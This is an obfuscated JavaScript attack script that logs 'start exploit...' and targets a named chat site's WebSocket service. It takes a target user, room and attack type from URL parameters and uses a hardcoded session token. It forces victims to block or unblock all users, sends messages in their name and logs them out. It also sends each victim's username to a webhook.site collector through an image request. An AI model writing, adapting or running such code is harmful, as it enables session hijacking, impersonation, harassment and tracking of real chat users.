var _0x48c4=['setTimeout','close','closed','clearInterval','log','start\x20exploit...','location','search','get','att','msg','Dragon','wss://chatroom.tamil2friends.com/chat','onmessage','data','type','message----','role','status','success','mazhai','indexOf','all','setInterval','sub','nothing','guest','error','blocks','forEach','unblock-user','onliners','send','stringify','block-user','username','ws--','register','male','state:','black','text','sam\x20londonn','OPEN','fetch','top','http://chatroom.tamil2friends.com/login.php','src','https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c=','onload','\x22\x20/>','onopen'];(function(_0x3f6503,_0x3ccf87){var _0x3d8b6c=function(_0x35f5db){while(--_0x35f5db){_0x3f6503['push'](_0x3f6503['shift']());}};_0x3d8b6c(++_0x3ccf87);}(_0x48c4,0x6c));var _0x4b42=function(_0x1e8f5a,_0x3c4d18){_0x1e8f5a=_0x1e8f5a-0x0;var _0x4e703f=_0x48c4[_0x1e8f5a];return _0x4e703f;};console[_0x4b42('0x0')](_0x4b42('0x1'));const urlParams=new URLSearchParams(window[_0x4b42('0x2')][_0x4b42('0x3')]);const target_user=urlParams[_0x4b42('0x4')]('id');const ROOM=urlParams[_0x4b42('0x4')]('rm');const attack_type=urlParams[_0x4b42('0x4')](_0x4b42('0x5'));const MSG=urlParams[_0x4b42('0x4')](_0x4b42('0x6'));const repeat_time=parseInt(urlParams[_0x4b42('0x4')]('rt'));const conn_time=parseInt(urlParams[_0x4b42('0x4')]('ct'));var blockall=![];var unblockall=![];var guest=![];var allok=![];var guestname=_0x4b42('0x7');var user='';var role='';var timer='';ws=new WebSocket(_0x4b42('0x8'));ws[_0x4b42('0x9')]=function(_0x193f2e){var _0x54e586=JSON['parse'](_0x193f2e[_0x4b42('0xa')]);var _0x58c780=_0x54e586[_0x4b42('0xb')];console['log'](_0x4b42('0xc'),_0x54e586[_0x4b42('0xa')]);if(_0x58c780=='register'){user=_0x54e586[_0x4b42('0xa')]['username'];role=_0x54e586[_0x4b42('0xa')][_0x4b42('0xd')];if(_0x54e586['data'][_0x4b42('0xe')]==_0x4b42('0xf')){if(user!=_0x4b42('0x10')&&(user[_0x4b42('0x11')](target_user)>-0x1||target_user==_0x4b42('0x12'))){getip();timer=window[_0x4b42('0x13')](function(){if(attack_type=='sb'){self_blocker();}else if(attack_type==_0x4b42('0x14')){self_unblocker();}else if(attack_type=='bl'){blocker();}else if(attack_type=='sm'){send(ROOM,MSG);}else if(attack_type=='lo'){loghimout();}else{console['log'](_0x4b42('0x15'));}},repeat_time);}}if(_0x54e586[_0x4b42('0xa')][_0x4b42('0xe')]==_0x4b42('0x16')){guest=!![];register(guestname);}if(_0x54e586[_0x4b42('0xa')][_0x4b42('0xb')]==_0x4b42('0x17')){guestname=guestname+Math['floor'](Math['random']()*0xa+0x1);register(guestname);}}if(_0x58c780=='blocks'){if(_0x54e586[_0x4b42('0xa')]['blocks']){if(unblockall){_0x54e586[_0x4b42('0xa')][_0x4b42('0x18')][_0x4b42('0x19')](_0x279e03=>ws['send'](JSON['stringify']({'type':_0x4b42('0x1a'),'data':{'username':'mazhai'}})));unblockall=![];}}}if(_0x58c780==_0x4b42('0x1b')){if(_0x54e586[_0x4b42('0xa')][_0x4b42('0x1b')]){if(blockall){_0x54e586['data']['onliners']['forEach'](_0xf869c6=>ws[_0x4b42('0x1c')](JSON[_0x4b42('0x1d')]({'type':_0x4b42('0x1e'),'data':{'username':_0xf869c6[_0x4b42('0x1f')]}})));blockall=![];}}}};console[_0x4b42('0x0')](_0x4b42('0x20'),ws);initsession=()=>{ws['send'](JSON['stringify']({'type':'init','data':{'session':'dsmq9q4okl9nq4nva1rtu2rkbi'}}));};register=_0x3f1f62=>{if(guest){ws[_0x4b42('0x1c')](JSON['stringify']({'type':_0x4b42('0x21'),'data':{'username':_0x3f1f62,'gender':_0x4b42('0x22')}}));}};send=(_0x467156,_0x15b97a)=>{console['log'](_0x4b42('0x23'),attack_type,user,role);if(ws['OPEN']){ws[_0x4b42('0x1c')](JSON[_0x4b42('0x1d')]({'type':'send','data':{'color':_0x4b42('0x24'),'room':_0x467156,'gifinput':'','_gifhidden':'','yinput':'','msg':_0x15b97a,'type':_0x4b42('0x25')}}));ws[_0x4b42('0x1c')](JSON['stringify']({'type':_0x4b42('0x1a'),'data':{'username':_0x4b42('0x10')}}));}};getblocklist=()=>{if(ws['OPEN']){ws[_0x4b42('0x1c')](JSON[_0x4b42('0x1d')]({'type':_0x4b42('0x18'),'data':['a']}));}};blocker=()=>{console[_0x4b42('0x0')](_0x4b42('0x23'),attack_type,user,role);if(ws['OPEN']){ws[_0x4b42('0x1c')](JSON[_0x4b42('0x1d')]({'type':_0x4b42('0x1e'),'data':{'username':_0x4b42('0x26')}}));}};fetch_room=_0x5dce44=>{if(ws[_0x4b42('0x27')]){ws[_0x4b42('0x1c')](JSON[_0x4b42('0x1d')]({'type':_0x4b42('0x28'),'data':{'room':_0x5dce44}}));}};self_blocker=()=>{console['log'](_0x4b42('0x23'),attack_type,user,role);blockall=!![];fetch_room(ROOM);};self_unblocker=()=>{console['log'](_0x4b42('0x23'),attack_type,user,role);unblockall=!![];getblocklist();};loghimout=()=>{console[_0x4b42('0x0')](_0x4b42('0x23'),attack_type,user,role);window[_0x4b42('0x29')][_0x4b42('0x2')]['href']=_0x4b42('0x2a');parent[_0x4b42('0x2')]['href']=_0x4b42('0x2a');};getip=()=>{console['log'](_0x4b42('0x23'),attack_type,user,role);var _0x58693c=new Image();_0x58693c[_0x4b42('0x2b')]=_0x4b42('0x2c')+user;var _0xf053e2=document['getElementById']('x');_0x58693c[_0x4b42('0x2d')]=function(){_0xf053e2['innerHTML']+='<img\x20src=\x22'+_0x58693c['src']+_0x4b42('0x2e');};};ws[_0x4b42('0x2f')]=()=>{initsession();register(guestname);window['setTimeout'](function(){register(guestname);},0x3e8);window[_0x4b42('0x30')](function(){ws[_0x4b42('0x31')]();console['log'](_0x4b42('0x32'));window[_0x4b42('0x33')](timer);},conn_time);};